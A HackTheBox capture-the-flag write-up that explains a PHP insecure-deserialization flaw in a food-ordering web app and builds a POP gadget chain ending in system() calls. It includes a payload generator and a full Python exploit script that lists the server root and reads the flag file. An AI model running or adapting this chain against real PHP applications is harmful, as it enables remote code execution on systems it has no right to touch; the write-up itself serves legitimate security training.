---
title: POP Restaurant
categories: [HackTheBox]
tags: [web, deserialization, php, pop chain, code review]
media_subpath: /images/hackthebox_poprestaurant/
---

## Summary

The challenge provides a web application for ordering food (Pizza, Ice Cream, Spaghetti). We are given the source code and a running instance. The goal is to find a vulnerability to read the flag from the server.

## Reconnaissance

### Application Structure

The application is built with PHP and uses a SQLite database. The file structure is as follows:

```
/challenge
├── index.php
├── login.php
├── order.php
├── register.php
├── Helpers/
│   ├── ArrayHelpers.php
│   └── CheckAuthentication.php
└── Models/
    ├── DatabaseModel.php
    ├── IceCreamModel.php
    ├── PizzaModel.php
    └── SpaghettiModel.php
```

### Source Code Analysis

We start by examining `order.php`, which handles food orders.

```php
// order.php
$order = unserialize(base64_decode($_POST['data']));
$foodName = get_class($order);
```

This snippet reveals a critical vulnerability: **Insecure Deserialization**. The application accepts a base64-encoded string from the `data` POST parameter and passes it directly to `unserialize()` without any validation. This allows an attacker to inject arbitrary serialized objects.

To exploit this, we need to find a "POP Chain" (Property Oriented Programming) using the available classes to achieve Remote Code Execution (RCE).

## Vulnerability Analysis: Building the POP Chain

We examine the classes defined in `Models/` and `Helpers/` to find magic methods that can be chained together.

### 1. The Trigger: `PizzaModel.php`

The `Pizza` class has a `__destruct()` method.

```php
class Pizza
{
    public $price;
    public $cheese;
    public $size;

    public function __destruct()
    {
        echo $this->size->what;
    }
}
```

*   **Trigger**: `__destruct()` is a PHP magic method automatically invoked when an object is no longer referenced or when the script execution finishes. This serves as the entry point for our chain.
*   **Action**: Inside the destructor, the code `echo $this->size->what;` attempts to access the property named `what` on whatever object is stored in the `$this->size` property.
*   **Next Step**: Since we control the object structure via serialization, we can assign an object to `$this->size` that does *not* have a `what` property. This will force PHP to look for a `__get()` magic method on that object to handle the access to the undefined property.

### 2. The Bridge: `SpaghettiModel.php`

The `Spaghetti` class has a `__get()` method.

```php
class Spaghetti
{
    public $sauce;
    public $noodles;
    public $portion;

    public function __get($tomato)
    {
        ($this->sauce)();
    }
}
```

*   **Trigger**: The `__get($tomato)` magic method is invoked because the `Pizza` class tried to access the undefined `what` property on this `Spaghetti` object.
*   **Action**: The method executes `($this->sauce)();`. In PHP, when you treat an object like a function (adding `()` after it), the language looks for an `__invoke()` magic method on that object.
*   **Next Step**: We need to place an object into the `$this->sauce` property that implements the `__invoke()` method. This allows us to jump from a property access context to a method execution context.

### 3. The Execution: `IceCreamModel.php`

The `IceCream` class has an `__invoke()` method.

```php
class IceCream
{
    public $flavors;
    public $topping;

    public function __invoke()
    {
        foreach ($this->flavors as $flavor) {
            echo $flavor;
        }
    }
}
```

*   **Trigger**: The `__invoke()` magic method is called because the `Spaghetti` class tried to execute our `IceCream` object as if it were a function.
*   **Action**: The method runs a `foreach` loop over `$this->flavors`. The `foreach` construct in PHP works on arrays, but if you pass it an object, it attempts to iterate over that object's properties or calls its iterator methods if it implements the `Iterator` interface.
*   **Next Step**: This is the crucial pivot. By setting `$this->flavors` to an object that implements `Iterator` (or extends a class that does, like `ArrayIterator`), we can force PHP to call specific iterator methods like `current()`, `next()`, or `key()` during the loop.

### 4. The Payload: `ArrayHelpers.php`

The `ArrayHelpers` class extends `ArrayIterator` and overrides `current()`.

```php
namespace Helpers;
use \ArrayIterator;

class ArrayHelpers extends ArrayIterator
{
    public $callback;

    public function current()
    {
        $value = parent::current();
        $debug = call_user_func($this->callback, $value);
        return $value;
    }
}
```

*   **Trigger**: The `current()` method is implicitly called by the `foreach` loop in `IceCreamModel` as it iterates over the object. Since `ArrayHelpers` extends `ArrayIterator`, it is a valid target for iteration.
*   **Action**: The overridden `current()` method calls `parent::current()` to get the current value, and then executes `call_user_func($this->callback, $value)`. `call_user_func` is a powerful PHP function that calls the callback given by the first parameter with the arguments given by the second.
*   **Exploit**: This gives us arbitrary code execution. We set `$this->callback` to a system command function (like `"system"`, `"exec"`, or `"passthru"`) and the data inside the array (the `$value`) to the OS command we want to run (e.g., `"id"` or `"ls -la"`).

### Summary of the Chain

1.  **`Pizza::__destruct()`** accesses `$this->size->what`.
2.  `$this->size` is a **`Spaghetti`** object. Accessing `what` triggers **`Spaghetti::__get()`**.
3.  **`Spaghetti::__get()`** calls `($this->sauce)()`.
4.  `$this->sauce` is an **`IceCream`** object. Calling it triggers **`IceCream::__invoke()`**.
5.  **`IceCream::__invoke()`** iterates over `$this->flavors`.
6.  `$this->flavors` is an **`ArrayHelpers`** object containing our command. The iteration triggers **`ArrayHelpers::current()`**.
7.  **`ArrayHelpers::current()`** executes `system(<command>)`.

## Exploitation

### 1. Generating the Payload

We create a PHP script to generate the serialized payload. Note that we must respect the namespace `Helpers` for `ArrayHelpers`.

```php
<?php
namespace Helpers {
    class ArrayHelpers extends \ArrayIterator {
        public $callback = "system";
    }
}

namespace {
    class Pizza { public $price; public $cheese; public $size; }
    class Spaghetti { public $sauce; public $noodles; public $portion; }
    class IceCream { public $flavors; public $topping; }

    use Helpers\ArrayHelpers;

    // Command to execute
    $cmd = "ls /"; 

    // Setup the chain
    $ah = new ArrayHelpers([$cmd]);
    $ic = new IceCream();
    $ic->flavors = $ah;
    $sp = new Spaghetti();
    $sp->sauce = $ic;
    $p = new Pizza();
    $p->size = $sp;

    echo base64_encode(serialize($p));
}
?>
```

### 2. Handling Output

When the command runs, the output is printed to the response. However, `order.php` contains a redirect:

```php
if ($result) {
    header("Location: index.php");
    die();
}
```

If we follow the redirect, we might miss the output. In HTTP, the body of a `302 Found` response can still contain data. We must ensure our exploit script does **not** follow redirects (`allow_redirects=False` in Python requests).

### 3. Finding the Flag

The output of `ls /` reveals a randomized flag filename (e.g., `pBhfMBQlu9uT_flag.txt`). We need to parse this filename and then run a second payload to `cat` it.

### Final Exploit Script

```python
import requests
import sys
import subprocess
import re
import os

# Configuration
if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <IP> <PORT>")
    sys.exit(1)

IP = sys.argv[1]
PORT = sys.argv[2]
BASE_URL = f"http://{IP}:{PORT}"

# PHP Payload Generator
PHP_CODE = r'''<?php
namespace Helpers {
    class ArrayHelpers extends \ArrayIterator {
        public $callback = "system";
    }
}
namespace {
    class Pizza { public $price; public $cheese; public $size; }
    class Spaghetti { public $sauce; public $noodles; public $portion; }
    class IceCream { public $flavors; public $topping; }
    
    $cmd = $argv[1];
    
    $ah = new \Helpers\ArrayHelpers([$cmd]);
    $ic = new IceCream(); $ic->flavors = $ah;
    $sp = new Spaghetti(); $sp->sauce = $ic;
    $p = new Pizza(); $p->size = $sp;
    
    echo base64_encode(serialize($p));
}
'''

def get_payload(cmd):
    with open("gen.php", "w") as f:
        f.write(PHP_CODE)
    res = subprocess.run(['php', 'gen.php', cmd], capture_output=True, text=True)
    os.remove("gen.php")
    return res.stdout.strip()

# Main Exploit
s = requests.Session()
# 1. Login (Register first if needed, code omitted for brevity)
# ...

# 2. List files to find flag
print("[*] Finding flag...")
payload = get_payload("ls /")
# IMPORTANT: allow_redirects=False to see the output in the 302 body
r = s.post(f"{BASE_URL}/order.php", data={'data': payload}, allow_redirects=False)

flag_file = re.search(r'([A-Za-z0-9]+_flag\.txt)', r.text).group(1)
print(f"[+] Found: {flag_file}")

# 3. Read flag
print("[*] Reading flag...")
payload = get_payload(f"cat /{flag_file}")
r = s.post(f"{BASE_URL}/order.php", data={'data': payload}, allow_redirects=False)

flag = re.search(r'(HTB\{.*?\})', r.text).group(1)
print(f"[+] Flag: {flag}")
```

## Conclusion

By chaining together the properties and magic methods of the `Pizza`, `Spaghetti`, `IceCream`, and `ArrayHelpers` classes, we were able to turn an insecure deserialization vulnerability into arbitrary code execution. The trickiest part was identifying the use of `ArrayIterator` to trigger the `current()` method and handling the HTTP redirect to capture the command output.